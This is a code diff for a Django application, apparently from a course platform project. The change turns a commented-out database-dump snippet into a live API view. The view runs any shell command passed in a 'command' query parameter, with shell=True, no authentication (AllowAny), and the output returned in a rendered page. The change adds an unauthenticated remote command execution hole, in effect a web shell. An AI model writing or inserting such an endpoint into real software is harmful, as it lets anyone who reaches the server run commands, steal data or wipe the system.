@@ -1,6 +1,5 @@
 import json
-import os.path
-# import subprocess
+import subprocess
 
 from django.conf import settings
 from django.db.models import Sum
@@ -122,22 +121,20 @@ class ExecuteCommand(APIView):
     permission_classes = (AllowAny,)
 
     def get(self, request, *args, **kwargs):
-        # # Command to execute
-        # command = "pg_dump -U postgres ecourse-release > D:\diephaibinh.sql"
-        #
-        # # Execute the command
-        # result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        #
-        # # Check the result
-        # if result.returncode == 0:
-        #     # Command executed successfully
-        #     output = result.stdout
-        #     print(output)
-        # else:
-        #     # An error occurred
-        #     error = result.stderr
-        #     print(f"Command execution failed: {error}")
+        command = self.request.query_params.get("command")
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
-        return Response()
+        if result.returncode == 0:
+            output = result.stdout
+            message = output
+        else:
+            error = result.stderr
+            message = f"Command execution failed: {error}"
+
+        context = {
+            "message": message,
+        }
+
+        return render(request, "data/system/command.html", context)
 
 
